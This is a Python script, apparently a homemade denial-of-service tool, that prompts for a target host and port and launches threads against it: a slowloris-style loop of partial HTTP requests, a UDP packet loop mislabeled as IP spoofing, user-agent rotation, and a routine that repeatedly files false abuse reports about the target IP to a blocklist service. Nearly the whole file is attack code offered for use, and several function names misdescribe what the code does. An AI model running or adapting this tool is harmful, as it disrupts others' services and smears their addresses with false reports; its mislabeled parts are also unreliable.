import socket
import random
import threading
import time
import requests

class FMSW:
    def __init__(self, target, port, threads):
        self.target = target
        self.port = port
        self.threads = threads
        self.is_running = False
        self.attack_duration = 300
        self.attack_interval = 10
        self.max_connections = 1000
        self.headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate, br",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
        ]
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
            "Mozilla/5.0 (Windows NT 6.1; rv:2.0b10) Gecko/20110126 Firefox/4.0b10",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/8.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3)",
            "Mozilla/5.0 (X11; Linux i686; rv:2.0b12pre) Gecko/20110204 Firefox/4.0b12pre",
            "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b9pre) Gecko/20101228 Firefox/4.0b9pre",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101128 Firefox/4.0b8pre",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:42.0) Gecko/20100101 Firefox/42.0",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CPNTDF; BRI/1)",
            "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.7.0",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/7.0)",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; fr; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15",
            "Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.40312/37.6334; U; en) Presto/2.12.423 Version/12.16",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; InfoPath.3; rctw)",
            "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.11 NintendoBrowser/4.3.0.11224.US",
            "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; NOKIA; Lumia 730 Dual SIM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10512",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
            "Mozilla/5.0 (Linux; U; Android 4.1; en-us; sdk Build/MR1) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.1 Safari/534.30",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/43.3.3.185 Chrome/43.0.2357.81 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; yie9)",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.34 Safari/534.24",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 UBrowser/5.4.4237.1024 Safari/537.36",
            "Mozilla/5.0 (iPod touch; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A405 Safari/600.1.4",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
            "Mozilla/5.0 (Linux; U; Android 4.4.4; fi-fi; GT-I9305 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
            "Mozilla/5.0 (Linux; U; Android 2.3.6; tr-tr; LG-E400 Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 MMS/LG-Android-MMS-V1.2",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/43.3.3.185 Chrome/43.0.2357.81 Safari/537.36",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; RRHSO_BLD1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.5.30729; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322; .NET4.0C; RRHSO_BLD1)",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; fr; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; Tablet PC 2.0)",
            "Opera/9.80 (Windows Phone; Opera Mini/8.1.0/37.6334; U; en) Presto/2.12.423 Version/12.16",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
            "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/5.1 Mobile/12H321 Safari/7600.1.4",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; WOW64; Trident/7.0; ASU2JS)",
            "Mozilla/5.0 (Linux; Android 4.4.2; en-gb; SAMSUNG SM-T330 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Safari/537.36",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0)",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.48 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3045.US Safari/537.1",
            "Mozilla/5.0 (Linux; U; Android 4.3; en-us; sdk Build/MR1) AppleWebKit/536.23 (KHTML, like Gecko) Version/4.3 Mobile Safari/536.23",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.46 Safari/537.36",
            "Mozilla/5.0 (New Nintendo 3DS like iPhone) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.0.5.15 Mobile NintendoBrowser/1.3.10126.EU",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
            "Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/8.0; Touch; WebView/2.0; rv:11.0; IEMobile/11.0; NOKIA; Lumia 929) like Gecko",
            "Mozilla/5.0 (Linux; U) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4",
            "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10",
            "Mozilla/5.0 (Windows NT The given key was not present in the dictionary.; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; chromeframe/26.0.1410.64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)",
            "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 1320) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.2; .NET4.0E)",
            "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko",
            "Mozilla/5.0 (Linux; Android 5.1; XT1025 Build/LPC23.13-34.5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.108 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
            "Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; SCH-I510 4G Build/FP8) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/536.30.1 (KHTML, like Gecko) Version/6.0.5 Safari/536.30.1",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/6.1.6 Safari/537.78.2",
            "Opera/9.80 (J2ME/MIDP; Opera Mini/4.0.13574/36.2596; U; en) Presto/2.12.423 Version/12.16",
            "SonyEricssonK630i/R1FA Browser/NetFront/3.4 Profile/MIDP-2.1 Configuration/CLDC-1.1",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17 AirBrowse/6.0.0.4",
            "Mozilla/5.0 (Linux; U; Android 4.2.2; fi-fi; SM-G350 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
            "Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; Valve Steam GameOverlay/1440016726; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
            "Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D201",
            "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; Lumia 435) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537",
            "Lynx/2.8.9dev.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/3.2.16",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36",
            "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; Lumia 535 Dual SIM) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537",
            "Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.3; rv:39.0) Gecko/20100101 Firefox/39.0",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E; InfoPath.3; AskTbPTV/5.11.3.15590)",
            "Mozilla/5.0 (X11; Linux x86_64; rv:29.0) Gecko/20100101 Firefox/29.0",
            "Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19",
            "Mozilla/5.0 (X11; Linux i686; rv:25.6) Gecko/20150723 PaleMoon/25.6.0",
            "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
            "Mozilla/5.0 (Windows NT 10.0; rv:40.0) Gecko/20100101 Firefox/40.0",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; Xbox)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; Xbox)",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Linux; Android 4.4.2; SC7 PRO HD Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Linux; U; Android 3.0.1; fr-fr; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:39.0) Gecko/20100101 Firefox/39.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0",
            "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 930) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537",
            "Mozilla/5.0 (Windows NT 6.2; rv:39.0) Gecko/20100101 Firefox/39.0",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; cs; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; WOW64; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.21022; .NET CLR 3.5.30729; .NET CLR 3.0.30618; MDDC; InfoPath.2; .NET4.0C)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:39.0) Gecko/20100101 Firefox/39.0",
            "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",        
            "Mozilla/5.0 (Windows NT 6.1; rv:41.0) Gecko/20100101 Firefox/41.0",
            "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.18 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/49.0.146 Chrome/43.0.2357.146 Safari/537.36",
            "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H143",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.102 Safari/535.2",
            "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190",
            "Mozilla/5.0 (Linux; Android 4.4.4; Nexus 7 Build/KTU84P) AppleWebKit/537.36 (KHTML like Gecko) Chrome/36.0.1985.135 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 4.4.4; W6S Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36",
            "Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54",
            "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
            "Mozilla/5.0 (BB10; Kbd) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.1.2576 Mobile Safari/537.35+",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:11.0) Gecko/20100101 Firefox/11.0",
            "Mozilla/5.0 (Linux; U; Android 4.3; en-us; SGH-T999 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
            "Mozilla/5.0 (Windows NT 6.1; rv:25.6) Gecko/20150723 Firefox/31.9 PaleMoon/25.6.0",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
            "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; Lumia 540 Dual SIM) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36",
            "Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0",
            "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
            "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 920) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537",
            "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
            "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile Safari/600.1.4",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36"
        ]
        self.random_user_agent = random.choice(self.user_agents)

    def start_attack(self):
        print("Attack started")
        self.is_running = True

        threading.Thread(target=self.stop_attack).start()
        threading.Thread(target=self.flood_dns).start()
        threading.Thread(target=self.rotate_user_agent).start()
        threading.Thread(target=self.spoof_ip).start()
        threading.Thread(target=self.slowloris).start()

    def stop_attack(self):
        time.sleep(self.attack_duration)
        self.is_running = False
        print("Attack stopped")

    def flood_dns(self):
        while self.is_running:
            try:
                requests.get("http://api.abuseipdb.com/api/v2/report", 
                             params={"ip": self.target, "categories": "21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40"}, 
                             headers={"Key": "API_KEY"})
                print("Successful flood_dns attack.")
            except Exception as e:
                print(f"Failed in flood_dns: {e}")
            time.sleep(1)

    def rotate_user_agent(self):
        while self.is_running:
            self.random_user_agent = random.choice(self.user_agents)
            print(f"User-Agent changed to: {self.random_user_agent}")
            time.sleep(30)

    def spoof_ip(self):
        while self.is_running:
            fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect((self.target, self.port))
                s.sendto(fake_ip.encode(), (self.target, self.port))
                s.close()
                print(f"Packet sent from spoofed IP: {fake_ip}")
            except Exception as e:
                print(f"Failed to send packet from spoofed IP: {fake_ip}, Error: {e}")
            time.sleep(1)

    def slowloris(self):
        while self.is_running:
            try:
                s = socket.create_connection((self.target, self.port))
                for _ in range(200):
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                s.send("\r\n".encode())
                print("Slowloris attack executed successfully.")
            except Exception as e:
                print(f"Failed to execute slowloris attack: {e}")
            finally:
                s.close()
            time.sleep(15)

if __name__ == "__main__":
    target = input("[!] -Target :")
    port = int(input("[!] -Port :"))
    threads = int(input("[!] -Attack rate ex(1000) :"))
    fmsw = FMSW(target, port, threads)
    fmsw.start_attack()